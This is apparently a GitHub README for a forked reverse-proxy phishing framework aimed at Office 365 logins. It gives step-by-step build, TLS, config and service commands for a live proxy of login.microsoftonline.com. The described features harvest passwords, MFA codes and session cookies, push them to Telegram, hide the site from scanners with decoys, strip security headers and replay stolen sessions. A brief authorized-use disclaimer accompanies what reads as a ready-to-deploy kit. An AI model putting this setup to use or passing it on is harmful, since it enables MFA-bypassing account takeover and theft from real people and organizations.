<div align="center">

# 🐟 Muraena — Enhanced Edition

**The industrial-grade phishing-simulation & session-awareness framework — rebuilt, hardened, and battle-tested for Office 365 engagements.**

![Version](https://img.shields.io/badge/version-1.25%20Enhanced-blue)
![Go](https://img.shields.io/badge/built%20with-Go%201.21-00ADD8?logo=go)
![Platform](https://img.shields.io/badge/platform-linux%20amd64-lightgrey)
![License](https://img.shields.io/badge/license-BSD--3-green)

**Fork of** [muraenateam/muraena](https://github.com/muraenateam/muraena) · **Maintained by** [@officialmonsterz](https://github.com/officialmonsterz)

</div>

---

> ⚠️ **AUTHORIZED USE ONLY**
> Muraena is a phishing-awareness and red-team simulation framework intended for **authorized security assessments, penetration tests, and security awareness training** — against assets you own or have **written permission** to test. Unauthorized use against real people or organizations is illegal. The authors and maintainers accept no liability for misuse.

---

## 📖 Table of Contents

- [What is Muraena?](#-what-is-muraena)
- [Why This Fork?](#-why-this-fork)
- [Features](#-features)
- [Fork vs. Upstream — What's Improved](#-fork-vs-upstream--whats-improved)
- [Supported Scenarios](#-supported-scenarios)
- [Quick Start](#-quick-start)
- [Architecture](#-architecture)
- [Watchdog — Anti-Bot Protection](#-watchdog--anti-bot-protection)
- [NecroBrowser Integration](#-necrobrowser-integration)
- [Roadmap — Upcoming Updates](#-roadmap--upcoming-updates)
- [Documentation](#-documentation)
- [FAQ](#-faq)
- [Legal & Ethics](#-legal--ethics)
- [Credits & Official Channels](#-credits--official-channels)

---

## 🎯 What is Muraena?

Muraena is an **open-source reverse-proxy phishing framework** written in Go. It sits between your target and a legitimate website (in this edition, tuned for **Microsoft Office 365 / Azure AD login**), serving a pixel-perfect, fully functional mirror of the real login flow over **valid TLS** — while transparently harvesting credentials, one-time codes, and authenticated session cookies in real time.

Think of it as *Evilginx's bigger, faster, config-driven sibling*:

- 🔁 **Full reverse proxy** — not a static clone. Every page, redirect, API call, and CDN asset is proxied live, so the site behaves exactly like the original.
- 🔐 **Real certificates** — DNS-01 issuance with full wildcard coverage means no browser certificate warnings.
- 🧠 **Session-aware** — captures the authenticated session, not just the password. MFA-protected accounts are fully in scope, because the session cookies *are* the session.
- ⚡ **Real-time exfiltration** — instant alerts the moment a victim submits data.

---

## 💪 Why This Fork?

Upstream Muraena is a great framework — but it ships as a **generic toolkit**. Getting it production-ready for a modern Office 365 engagement takes days of debugging: certificate automation, dynamic Microsoft CDN subdomains, security-header rewriting, Telegram alerting, watchdog tuning.

**This edition ships all of that pre-configured and pre-tested**, with a complete A-to-Z `DEPLOYMENT.md` that documents every step, every expected output, and every failure mode we hit and fixed — so you go from bare VPS to fully operational in under an hour.

### Highlights of this edition

| | |
|---|---|
| 🚀 | **Deploy in <1 hour** — full step-by-step deployment guide with expected outputs |
| 🔒 | **Zero-touch wildcard TLS** — automated Let's Encrypt via Cloudflare API (DNS-01), auto-renewing, systemd-timer driven |
| 🏷️ | **Production-ready O365 config** — every Microsoft origin mapped, tested live |
| 📱 | **Real-time Telegram alerts** — credentials, MFA codes, and session tokens delivered instantly |
| 🛡️ | **Hardened watchdog rules** — scanners and blue-team recon get served decoys |
| 🍪 | **Complete session capture** — exportable cookie jars for session-replay validation |

---

## ✨ Features

### Core Proxy Engine
- **Full reverse proxying** with dynamic origin mapping — Microsoft's sprawling CDN ecosystem (`msauth.net`, `msftauth.net`, `office.net`, `live.com`, `windows.net`, and more) is mapped automatically to `cdn-N.yourdomain.com` subdomains, including **wildcard origin support** for dynamically discovered subdomains.
- **Deep content rewriting** — HTML, CSS, and JavaScript are rewritten on the fly so every URL, form action, and API endpoint points back to you.
- **HTTP → HTTPS redirect** on a configurable port.
- **Custom TLS stack** — modern TLS 1.2+, with optional SSLKEYLOGFILE support for full traffic decryption in Wireshark during engagements.

### Credential & Session Capture
- **Real-time secret tracking** with per-path, per-pattern rules — O365 usernames, passwords, TOTP/MFA codes, OAuth authorization codes, access tokens, refresh tokens, and ID tokens.
- **Session cookie harvesting** across all proxied domains, including `HttpOnly`/`Secure` cookies.
- **Victim tracking** with unique session identifiers, IP, and User-Agent correlation.
- **Full cookie-jar export** to JSON for session-replay validation in the browser.

### Real-Time Notifications
- **Telegram integration** — every captured credential, MFA code, and session token is pushed to your chat within seconds of submission.
- Per-victim labeling so concurrent targets never get mixed up.

### Anti-Detection & Hardening
- **Watchdog module** — rule-based blocking of security scanners, sandboxes, and known-bad User-Agents/IPs, backed by a GeoIP database.
- **Dynamic decoy content** — blocked visitors are served innocuous responses instead of the real page.
- **Security-header stripping** — removes `X-Frame-Options`, `CSP`, `X-Content-Type-Options` and friends from responses so the mirrored site behaves naturally.
- **Fingerprint hygiene** — strips `X-Forwarded-For`, `X-Real-IP`, and other proxy-revealing headers.
- **SRI bypass** — rewrites `integrity=` attributes so modified scripts load without errors.

### Operations
- **Redis-backed session storage** with persistence (BGSAVE-compatible backups).
- **Interactive console** — `victims`, `credentials`, `export` commands at your fingertips.
- **systemd-ready** — ships as a hardened service with auto-restart, Redis dependency, and file-limit tuning.
- **GeoIP enrichment** via bundled MaxMind database.

---

## 📊 Fork vs. Upstream — What's Improved

| Capability | Upstream Muraena | **This Fork (Enhanced Edition)** |
|---|---|---|
| Office 365 scenario | Generic; heavy manual config | ✅ **Pre-built, live-tested O365 config** — every Microsoft origin, transform, and tracking rule included |
| Wildcard TLS certificates | Manual certbot / manual TXT dance | ✅ **Fully automated DNS-01 via Cloudflare API** — one command, staging→production migration, auto-renewal via systemd timer |
| TLS script tooling | ❌ None | ✅ **TLS.sh v2.3.1** — multi-domain, staging/dry-run modes, secret-safe logging, deploy hooks, cross-distro |
| Wildcard origin mapping | Two-label hostnames break on deep MS CDN chains (`privacynotice.cdn-3.…`) | ✅ **`*.origin` wildcard support** — every dynamically discovered subdomain gets its own clean single-label host |
| Security-header handling | Basic | ✅ **Complete CSP/XFO/Report-To stripping + SRI rewrite** for pixel-perfect rendering |
| Real-time alerts | ❌ Requires external glue | ✅ **Built-in Telegram push** for credentials, MFA codes, and session tokens |
| O365 tracking paths | Generic defaults | ✅ **Complete path + pattern set** — login, GetCredentialType, SAS/ProcessAuth, BeginAuth, OAuth token endpoints |
| Documentation | Minimal | ✅ **A-to-Z `DEPLOYMENT.md`** — every step, expected output, and 26 real troubleshooting entries |
| Deployment time (VPS → live) | Days of debugging | ⚡ **Under 1 hour** |

---

## 🎭 Supported Scenarios

This edition ships tuned for:

- **Office 365 / Microsoft Account** — consumer and organizational login flows (`login.microsoftonline.com`, `login.live.com`)

The engine is scenario-agnostic — any site can be proxied by writing a config. Additional scenario packs are on the roadmap (see below).

---

## 🚀 Quick Start

> **Full A-to-Z guide with expected outputs:** see [`DEPLOYMENT.md`](./DEPLOYMENT.md)

### 1. Build

```bash
git clone https://github.com/officialmonsterz/muraena.git
cd muraena
go build -o muraena .
```

### 2. Install dependencies

```bash
sudo apt install -y redis-server certbot python3-certbot-dns-cloudflare
systemctl enable --now redis-server
redis-cli ping   # → PONG
```

### 3. Issue your wildcard certificate (automated)

```bash
sudo bash TLS.sh -d yourdomain.com -e you@example.com -t YOUR_CLOUDFLARE_TOKEN -w -y
```

DNS prerequisites: `@` and `*` A-records pointing at your VPS, **grey-clouded (DNS only)**.

### 4. Configure

Edit `config/config.toml`:

```toml
[proxy]
    phishing = "yourdomain.com"
    destination = "login.microsoftonline.com"
    IP = "0.0.0.0"
    port = 443

[tls]
    enable = true
    certificate = "/etc/letsencrypt/live/yourdomain.com/fullchain.pem"
    key = "/etc/letsencrypt/live/yourdomain.com/privkey.pem"
    root = "/etc/letsencrypt/live/yourdomain.com/chain.pem"

[telegram]
    enable = true
    botToken = "YOUR-BOT-TOKEN"
    chatIDs = ["YOUR-CHAT-ID"]
```

### 5. Run

```bash
./muraena --config ./config/config.toml
```

Expected:

```
inf: Connected to Redis
inf Muraena is alive on 0.0.0.0:443
[ yourdomain.com ] ==> [ login.microsoftonline.com ]
```

### 6. Run as a service (production)

```bash
sudo tee /etc/systemd/system/muraena.service <<'EOF'
[Unit]
Description=Muraena Proxy
After=network.target redis-server.service
Requires=redis-server.service

[Service]
WorkingDirectory=/root/muraena
ExecStart=/root/muraena/muraena --config /root/muraena/config/config.toml
Restart=always
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload && sudo systemctl enable --now muraena
```

---

## 🏗️ Architecture

```
                         ┌──────────────────────────────┐
  Victim ── HTTPS ──────►│  yourdomain.com (Muraena)    │
                         │  ┌────────────────────────┐  │
                         │  │ Watchdog (allow/block) │  │
                         │  ├────────────────────────┤  │
                         │  │ Reverse Proxy Engine   │──┼──► login.microsoftonline.com
                         │  │  • URL rewriting       │  │      + all Microsoft CDNs
                         │  │  • Header transforms   │  │
                         │  │  • TLS termination     │  │
                         │  ├────────────────────────┤  │
                         │  │ Tracking / Secrets     │  │
                         │  └───────────┬────────────┘  │
                         └──────────────┼───────────────┘
                                        │
                             ┌──────────┴──────────┐
                             ▼                     ▼
                        🔴 Redis (sessions)   📱 Telegram (alerts)
                             │
                        🍪 Cookie-jar export → session replay
```

**How it works, in plain terms:**

1. The victim clicks your link and lands on your domain. Muraena assigns them a unique tracking ID and serves the real Microsoft login page (proxied live, over a valid certificate).
2. Every sub-resource — logos, scripts, CDN assets from `aadcdn.msauth.net` and friends — is transparently rewritten to `cdn-N.yourdomain.com`, so the page renders perfectly.
3. When the victim submits credentials or an MFA code, Muraena's pattern engine matches the request, stores it, and fires a Telegram alert instantly.
4. On successful login, the authenticated session cookies are captured and stored. Because the session cookies *are* the session, MFA is not a barrier — the proxy is transparent to the authentication flow.
5. Cookie jars can be exported (`export` → victim ID) and re-imported into a browser to validate the captured session.

---

## 🛡️ Watchdog — Anti-Bot Protection

The watchdog filters traffic before it ever reaches the proxy:

- **Rule-based matching** (`config/watchdog.rules`) on IP, User-Agent, and request patterns
- **Dynamic mode** — learn and adapt rules during the engagement
- **GeoIP awareness** via the bundled `geoDB.mmdb`
- Blocked visitors receive harmless decoy responses — no hints, no fingerprints, no reportable phishing indicators for automated scanners

---

## 🤖 NecroBrowser Integration

Muraena optionally hands captured sessions to [NecroBrowser](https://github.com/muraenateam/necrobrowser) — an instrumented-browser automation service that replays each stolen session inside a real browser (login persistence, mailbox automation, evidence collection) using the bundled `config/instrument.necro` profile. Trigger it on the Microsoft auth cookies (`ESTSAUTH`, `ESTSAUTHPERSISTENT`) with a configurable delay.

Disabled by default; enable in `[necrobrowser]` if you run NecroBrowser infrastructure.

---

## 🗺️ Roadmap — Upcoming Updates

- [ ] **Additional scenario packs** — Google Workspace, social-media logins, corporate SSO portals
- [ ] **Web dashboard** — real-time victims/credentials view, replacing the console for remote ops
- [ ] **Multi-channel alerting** — Slack, Discord, webhook support alongside Telegram
- [ ] **Encrypted loot storage** — at-rest encryption for captured data in Redis
- [ ] **One-click deployment script** — full VPS provisioning (deps + TLS + service) in a single command
- [ ] **Let's Encrypt renewal auto-restart** — Muraena hot-reload on certificate renewal
- [ ] **Enhanced watchdog ML mode** — anomaly-based scanner detection
- [ ] **NecroBrowser v2 profiles** — expanded O365 automation actions

⭐ Star the repo and watch for releases.

---

## 📚 Documentation

| Document | Contents |
|---|---|
| [`DEPLOYMENT.md`](./DEPLOYMENT.md) | **Complete A-to-Z deployment** — DNS, Cloudflare API tokens, TLS automation, config, systemd, verification, cookie replay, teardown, and a 26-entry troubleshooting table |
| [`config/config.toml`](./config/config.toml) | Annotated O365 reference configuration |
| Upstream wiki | [muraenateam/muraena wiki](https://github.com/muraenateam/muraena/wiki) |

---

## ❓ FAQ

<details>
<summary><b>The Cloudflare API token doesn't show when I paste it — is it broken?</b></summary>
No. The prompt uses a silent read on purpose so the token never appears in your terminal, scrollback, or screenshots. Paste it and press Enter — it was received.
</details>

<details>
<summary><b>Certbot error <code>9109: Cannot use the access token from location: &lt;IPv6&gt;</code></b></summary>
Your Cloudflare token has <b>Client IP Address Filtering</b> enabled and your server connects from an IP outside the allowed list. Edit the token in the Cloudflare dashboard and leave IP filtering completely empty.
</details>

<details>
<summary><b>Browser shows <code>SEC_ERROR_UNKNOWN_ISSUER</code></b></summary>
You installed a Let's Encrypt <b>staging</b> certificate (deliberately untrusted). Delete the lineage (<code>sudo certbot delete --cert-name yourdomain.com</code>) and re-issue without staging. Full fix in <code>DEPLOYMENT.md</code>, Chapter 6.3.
</details>

<details>
<summary><b>Can Muraena bypass hardware keys / FIDO2 passkeys?</b></summary>
No — and nothing using a reverse proxy can. FIDO2 challenge-response is bound to the origin and the hardware key. Any tooling or vendor claiming otherwise is misleading you. Report FIDO2-protected accounts honestly as out of scope.
</details>

<details>
<summary><b>Does this work against real MFA?</b></summary>
The framework captures whatever the authentication flow presents — including TOTP/OTP codes in real time, and authenticated session cookies after login. It is a transparent proxy, so any factor that flows through the browser is in scope. Hardware-bound factors (FIDO2) are not.
</details>

</details>

---

## ⚖️ Legal & Ethics

- Muraena is released under the **BSD-3-Clause** license (upstream: [muraenateam/muraena](https://github.com/muraenateam/muraena)).
- This framework is for **authorized security testing and awareness training only**. Deploy it solely against assets you own or are contractually authorized to test, with a defined scope and rules of engagement.
- You are responsible for complying with all applicable laws (including CFAA, Computer Misuse Act, and equivalents) in your jurisdiction.
- At engagement end: revoke certificates, rotate all API tokens, wipe captured data, and deliver findings per your rules of engagement. A complete teardown checklist is in `DEPLOYMENT.md`.

---

## 📡 Credits & Official Channels

**Maintained & enhanced by OfficialMonsterz**

| Channel | Link |
|---|---|
| 📢 **Official Channel & Tools** | [t.me/officialmonsterz](https://t.me/officialmonsterz) |
| 👤 **Official Username** | [@officialmonstersadmin](https://t.me/officialmonstersadmin) |
| 📢 **Official Backup Channel** | [t.me/officialmonsters](https://t.me/officialmonsters) |
| 💻 **GitHub Official** | [github.com/officialmonsterz](https://github.com/officialmonsterz) |
| 🔒 **Signal Official** | [bit.ly/3RXMrFa](https://bit.ly/3RXMrFa) |
| ✉️ **E-mail Official** | [shapads@tutamail.com](mailto:shapads@tutamail.com) |

**Upstream project & credits:**
- Original Muraena by **@antisnatchor** & **@ohpe** — [muraenateam/muraena](https://github.com/muraenateam/muraena)
- [NecroBrowser](https://github.com/muraenateam/necrobrowser) by the Muraena team
- [Go](https://go.dev) · [Redis](https://redis.io) · [Certbot / Let's Encrypt](https://certbot.eff.org) · [Cloudflare](https://www.cloudflare.com) · [MaxMind GeoIP](https://www.maxmind.com)

---

<div align="center">

**⭐ If this project saved you hours of setup time, star the repo.**

*Use responsibly. Test only what you're authorized to test.*

</div>
